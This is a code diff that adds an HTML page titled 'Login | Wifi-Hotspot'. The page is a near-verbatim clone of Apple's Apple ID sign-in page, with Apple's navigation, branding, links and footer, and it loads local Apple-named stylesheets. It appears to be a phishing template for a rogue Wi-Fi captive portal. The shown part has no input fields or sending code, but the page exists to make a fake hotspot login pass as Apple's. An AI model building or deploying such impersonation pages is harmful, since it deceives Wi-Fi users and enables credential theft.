@@ -1,1 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login | Wifi-Hotspot</title>
+    <link href="./theme/css/apple_global.css" rel="stylesheet" type="text/css">
+    <link href="./theme/css/apple_gfooter.css" rel="stylesheet" type="text/css">
+    <link href="./theme/css/apple_sub.css" rel="stylesheet" type="text/css">
+</head>
+<body>
 
+    <nav id="ac-globalnav" class="js no-touch flexbox" role="navigation" aria-label="Global Navigation" data-hires="false" data-analytics-region="global nav" lang="en-US" dir="ltr" data-store-locale="us" data-store-api="/[storefront]/shop/bag/status" data-search-locale="en_US" data-search-api="/search-services/suggestions/">
+      <div class="ac-gn-content">
+        <ul class="ac-gn-header">
+          <li class="ac-gn-item ac-gn-menuicon">
+            <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+              <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+                <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+              </span>
+              <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+                <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+              </span>
+            </label>
+            <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+              <span class="ac-gn-menuanchor-label">Open Menu</span>
+            </a>
+            <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+              <span class="ac-gn-menuanchor-label">Close Menu</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-apple">
+            <a class="ac-gn-link ac-gn-link-apple" href="/" data-analytics-title="apple home" id="ac-gn-firstfocus-small">
+              <span class="ac-gn-link-text">Apple</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+            <a class="ac-gn-link ac-gn-link-bag" href="/us/shop/goto/bag" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items" role="button" aria-haspopup="true" aria-expanded="false" aria-controls="ac-gn-bagview-content">
+              <span class="ac-gn-link-text">Shopping Bag</span>
+              <span class="ac-gn-bag-badge"></span>
+            </a>
+            <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+          </li>
+        </ul>
+        <ul class="ac-gn-list">
+          <li class="ac-gn-item ac-gn-apple">
+            <a class="ac-gn-link ac-gn-link-apple" href="/" data-analytics-title="apple home" id="ac-gn-firstfocus">
+              <span class="ac-gn-link-text">Apple</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+            <a class="ac-gn-link ac-gn-link-mac" href="/mac/" data-analytics-title="mac">
+              <span class="ac-gn-link-text">Mac</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+            <a class="ac-gn-link ac-gn-link-ipad" href="/ipad/" data-analytics-title="ipad">
+              <span class="ac-gn-link-text">iPad</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+            <a class="ac-gn-link ac-gn-link-iphone" href="/iphone/" data-analytics-title="iphone">
+              <span class="ac-gn-link-text">iPhone</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+            <a class="ac-gn-link ac-gn-link-watch" href="/watch/" data-analytics-title="watch">
+              <span class="ac-gn-link-text">Watch</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+            <a class="ac-gn-link ac-gn-link-tv" href="/tv/" data-analytics-title="tv">
+              <span class="ac-gn-link-text">TV</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+            <a class="ac-gn-link ac-gn-link-music" href="/music/" data-analytics-title="music">
+              <span class="ac-gn-link-text">Music</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+            <a class="ac-gn-link ac-gn-link-support" href="https://support.apple.com" data-analytics-title="support">
+              <span class="ac-gn-link-text">Support</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+            <a class="ac-gn-link ac-gn-link-search" href="/us/search" data-analytics-title="search" data-analytics-click="search" data-analytics-intrapage-link="" aria-label="Search apple.com" role="button" aria-haspopup="true">
+              <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com</span>
+            </a>
+          </li>
+          <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+            <a class="ac-gn-link ac-gn-link-bag" href="/us/shop/goto/bag" data-analytics-title="bag" data-analytics-click="bag" aria-label="Shopping Bag" data-string-badge="Shopping Bag with Items" role="button" aria-haspopup="true" aria-expanded="false" aria-controls="ac-gn-bagview-content">
+              <span class="ac-gn-link-text">Shopping Bag</span>
+              <span class="ac-gn-bag-badge" aria-hidden="true"></span>
+            </a>
+            <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+          </li>
+        </ul>
+        <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
+          <div class="ac-gn-searchview-content">
+            <form id="ac-gn-searchform" class="ac-gn-searchform" action="/us/search" method="get">
+              <div class="ac-gn-searchform-wrapper">
+                <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" aria-label="Search apple.com" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+              </div>
+            </form>
+            <aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults=""></aside>
+          </div>
+          <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+              <span class="ac-gn-searchview-close-wrapper">
+                <span class="ac-gn-searchview-close-left"></span>
+                <span class="ac-gn-searchview-close-right"></span>
+              </span>
+            </button>
+        </aside>
+        <aside class="ac-gn-bagview" data-analytics-region="bag">
+          <div class="ac-gn-bagview-scrim">
+            <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+          </div>
+          <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+          </div>
+        </aside>
+      </div>
+    </nav>
+
+
+
+    <subnav {(page)}="page" {use-routing}="useRouting">
+        <div class="subnav">
+  <div class="container">
+      <div class="title tk-label pull-left">Apple&nbsp;ID</div>
+      <div class="menu-wrapper pull-right">
+          <ul class="menu">
+              <li class="item active">
+                  <a href="/" class="btn btn-link tk-caption btn-signin" title="Sign In">Sign In</a>
+              </li>
+              <li class="item ">
+                  <a href="/account" class="btn btn-link tk-caption btn-create" title="Create Your Apple ID">Create Your Apple&nbsp;ID</a>
+              </li>
+              <li class="item">
+                  <a href="/faq" class="btn btn-link tk-caption btn-faq" title="Frequently Asked Questions">FAQ</a>
+              </li>
+          </ul>
+      </div>
+  </div>
+</div>
+
+</subnav>
+
+<div class="app-container">
+  <div class="hero-wrapper"> <hero {(page)}="page">
+
+
+
+
+
+
+          <div class="hero signin">
+
+
+            <h1 class="sr-only">Apple&nbsp;ID</h1>
+
+          </div>
+
+
+        </hero></div>
+          <div id="app-content">
+
+
+              <div id="forgot-link" class="tk-subbody forgot">
+                <a role="link" target="_blank" href="https://iforgot.apple.com/password/verify/appleid" title="">
+                  Forgot Apple ID or password?
+                </a>
+              </div>
+              <signin {(page)}="page">
+
+
+
+
+
+
+                <div id="aidSignin" class="aid-signin">
+          <div class="flow-body signin clearfix" role="main">
+              <div class="container">
+                  <div class="flex home-content">
+                      <h2 class="title separator tk-section-headline your-account">
+                        Your account for&nbsp;everything&nbsp;Apple.
+                      </h2>
+                      <div class="intro-signin">A single Apple&nbsp;ID and password gives you access to all Apple services.
+
+                          <a class="button link faq-link" href="/faq" title="Learn more about Apple ID">
+                              Learn more about Apple&nbsp;ID<i class="icon icon-text icon_right_chevron"></i>
+                          </a>
+                      </div>
+
+                      <div class="apps text-center">
+                              <div class="app-icons-2x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Center."></div>
+                      </div>
+                      <div class="mobile-apps text-center mobile-only">
+                              <div class="mobile-icons-2x" title="Apple Apps and Services: iCloud, App Store, iTunes, iBooks, Messages, FaceTime, Apple Store, Game Center."></div>
+                      </div>
+                      <div class="intro-signin create show">
+                          <span class="mobile-only"></span>
+                          <span class="not-mobile"></span>
+                          <a class="button link create-link" href="/account" title="Create your Apple ID">Create your Apple&nbsp;ID<i class="icon icon-text icon_right_chevron"></i></a>
+                      </div>
+                  </div>
+              </div>
+          </div>
+      </div>
+
+
+        </signin>
+
+          </div>
+        </div>
+
+
+
+
+        <div class="global-footer">
+            <footer id="ac-globalfooter" class="js flexbox" lang="en-US" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label">
+                <div class="ac-gf-content">
+                    <h2 class="ac-gf-label" id="ac-gf-label">Apple Footer</h2>
+                     <style>#ac-globalfooter .ac-gf-footer-legal-link:last-child  {margin: 3px 0 0 0;} #ac-globalfooter .ac-gf-footer {border-top: none;}</style><section class="ac-gf-footer">
+
+        <div class="ac-gf-footer-shop" x-ms-format-detection="none">
+            More ways to shop: Visit an <a href="//www.apple.com/retail/">Apple Store</a>, <span class="nowrap">call 1-800-MY-APPLE, or <a href="https://locate.apple.com/">find a reseller</a></span>.
+          </div>
+
+        <div class="ac-gf-footer-locale">
+
+        <a class="ac-gf-footer-locale-link choose" title="Choose your country or region" href="/choose-your-country">
+            <img src="https://appleid.cdn-apple.com/static/bin/cb4152743870/images/countryFooterFlags/22x22/USAflag.png" alt="United States" width="17" class="ac-gf-footer-locale-flag" height="17">
+            United States
+        </a>
+        </div>
+
+          <div class="ac-gf-footer-legal">
+            <div class="ac-gf-footer-legal-copyright">Copyright © 2018 Apple Inc. All rights reserved.</div>
+            <div class="ac-gf-footer-legal-links">
+
+         <a class="ac-gf-footer-legal-link" href="&#10;//www.apple.com/privacy/privacy-policy/">Privacy Policy</a>
+
+
+         <a class="ac-gf-footer-legal-link" href="&#10;//www.apple.com/legal/internet-services/terms/site.html">Terms of Use</a>
+
+
+         <a class="ac-gf-footer-legal-link" href="&#10;//www.apple.com/us/shop/goto/help/sales_refunds">Sales and Refunds</a>
+
+
+         <a class="ac-gf-footer-legal-link" href="&#10;//www.apple.com/legal/">Legal</a>
+
+
+
+         <a class="ac-gf-footer-legal-link" href="&#10;//www.apple.com/sitemap/">Site Map</a>
+
+            </div>
+          </div>
+        </section>
+
+                </div>
+            </footer>
+
+          </div>
+</body>
+</html>
